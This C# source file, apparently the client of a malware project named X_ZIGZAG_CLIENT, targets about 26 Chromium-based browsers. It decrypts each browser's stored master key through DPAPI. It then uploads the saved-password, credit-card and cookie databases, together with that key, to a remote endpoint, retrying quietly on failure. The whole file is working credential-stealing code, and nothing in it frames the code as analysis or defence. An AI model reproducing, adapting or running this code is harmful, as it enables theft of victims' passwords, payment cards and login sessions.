﻿using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Web.Script.Serialization;
using System.Threading.Tasks;
using System.Net.Http;

namespace X_ZIGZAG_CLIENT
{
    internal class BrowserData
    {
        public static string default_appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
        public static string local_appdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
       
         public static string[] chromiumBrowsers = new string[]
        {
                 "Google\\Chrome",
                "Chromium",
                "Google(x86)\\Chrome",
                "BraveSoftware\\Brave-Browser",
                "Epic Privacy Browser",
                "Amigo",
                "360Browser\\Browser",
                "Vivaldi",
                "Comodo",
                "Yandex\\YandexBrowser",
                "Mail.Ru\\Atom",
                "Kometa",
                "Comodo\\Dragon",
                "Maxthon3",
                "Torch",
                "Orbitum",
                "K-Melon",
                "Sputnik\\Sputnik",
                "Nichrome",
                "Slimjet",
                "CocCoc\\Browser",
                "uCozMedia\\Uran",
                 "Opera Software\\Opera Stable",
                 "Opera Software\\Opera GX Stable",
                "Chromodo",
                "Microsoft\\Edge"
        };
        public static byte[] GetChromiumBasedSecretKey(string chromeLocalStatePath)
        {
            try
            {
                // (1) Get secretkey from chrome local state
                string localStateJson = File.ReadAllText(chromeLocalStatePath, Encoding.UTF8);
                var serializer = new JavaScriptSerializer();
                dynamic localState = serializer.Deserialize<object>(localStateJson);
                string encryptedKeyBase64 = localState["os_crypt"]["encrypted_key"];
                byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);

                // Remove suffix DPAPI
                byte[] encryptedKeyWithoutPrefix = new byte[encryptedKey.Length - 5];
                Array.Copy(encryptedKey, 5, encryptedKeyWithoutPrefix, 0, encryptedKeyWithoutPrefix.Length);

                byte[] secretKey = ProtectedData.Unprotect(encryptedKeyWithoutPrefix, null, DataProtectionScope.CurrentUser);
                return secretKey;
            }
            catch
            {
                return null;
            }
        }

        public static async Task SendPasswordsDBWithRetry(string endpointUrl, string browser, byte[] secretKey, string dataPath, int maxRetries)
        {
            TimeSpan delay = TimeSpan.FromSeconds(10);
            int retryCount = 0;
                while (retryCount < maxRetries)
                {
                    try
                    {
                        var client = new HttpClient();
                        // Add the file
                        using (FileStream fileStream = new FileStream(dataPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                        using (MemoryStream memoryStream = new MemoryStream())
                        {
                            await fileStream.CopyToAsync(memoryStream);
                            string fileData = Convert.ToBase64String(memoryStream.ToArray());
                            string secretKeyString = Convert.ToBase64String(secretKey);
                            string contectData = $"{{\"Key\":\"{secretKeyString}\",\"Data\":\"{fileData}\",\"Browser\":\"{browser.Replace(@"\","-")}\"}}";
                            var content = new StringContent(contectData, Encoding.UTF8, "application/json");
                            client.Timeout = TimeSpan.FromMinutes(10);
                            HttpResponseMessage response = await client.PostAsync(endpointUrl, content);
                            if (response.IsSuccessStatusCode)
                            {
                                break; 
                            }
                            retryCount++;
                        }
                        
                    }
                    catch
                    {
                        retryCount++;
                        if (retryCount >= maxRetries)
                        {
                            break;
                        }

                        await Task.Delay(delay);
                        delay = TimeSpan.FromSeconds(Math.Min(delay.TotalSeconds * 2, 60));
                }
                
            }
        }
        public static async Task SendCreditCardDBWithRetry(string endpointUrl, string browser, byte[] secretKey, string dataPath, int maxRetries)
        {
            TimeSpan delay = TimeSpan.FromSeconds(10);
            int retryCount = 0;
            while (retryCount < maxRetries)
            {
                try
                {
                    var client = new HttpClient();
                    // Add the file
                    using (FileStream fileStream = new FileStream(dataPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        await fileStream.CopyToAsync(memoryStream);
                        string fileData = Convert.ToBase64String(memoryStream.ToArray());
                        string secretKeyString = Convert.ToBase64String(secretKey);
                        string contectData = $"{{\"Key\":\"{secretKeyString}\",\"Data\":\"{fileData}\",\"Browser\":\"{browser.Replace(@"\", "-")}\"}}";
                        var content = new StringContent(contectData, Encoding.UTF8, "application/json");
                        client.Timeout = TimeSpan.FromMinutes(10);
                        HttpResponseMessage response = await client.PostAsync(endpointUrl, content);
                        if (response.IsSuccessStatusCode)
                        {
                            break;
                        }
                        retryCount++;
                    }

                }
                catch
                {
                    retryCount++;
                    if (retryCount >= maxRetries)
                    {
                        break;
                    }

                    await Task.Delay(delay);
                    delay = TimeSpan.FromSeconds(Math.Min(delay.TotalSeconds * 2, 60));
                }

            }
        }
        public static async Task SendCookiesDBWithRetry(string endpointUrl, string browser, byte[] secretKey, string dataPath, int maxRetries)
        {
            TimeSpan delay = TimeSpan.FromSeconds(10);
            int retryCount = 0;
            while (retryCount < maxRetries)
            {
                try
                {
                    var client = new HttpClient();
                    // Add the file
                    using (FileStream fileStream = new FileStream(dataPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        await fileStream.CopyToAsync(memoryStream);
                        string fileData = Convert.ToBase64String(memoryStream.ToArray());
                        string secretKeyString = Convert.ToBase64String(secretKey);
                        string contectData = $"{{\"Key\":\"{secretKeyString}\",\"Data\":\"{fileData}\",\"Browser\":\"{browser.Replace(@"\", "-")}\"}}";
                        var content = new StringContent(contectData, Encoding.UTF8, "application/json");
                        client.Timeout = TimeSpan.FromMinutes(10);
                        HttpResponseMessage response = await client.PostAsync(endpointUrl, content);
                        if (response.IsSuccessStatusCode)
                        {
                            break;
                        }
                        retryCount++;
                    }

                }
                catch
                {
                    retryCount++;
                    if (retryCount >= maxRetries)
                    {
                        break;
                    }

                    await Task.Delay(delay);
                    delay = TimeSpan.FromSeconds(Math.Min(delay.TotalSeconds * 2, 60));
                }

            }
        }
    }
}
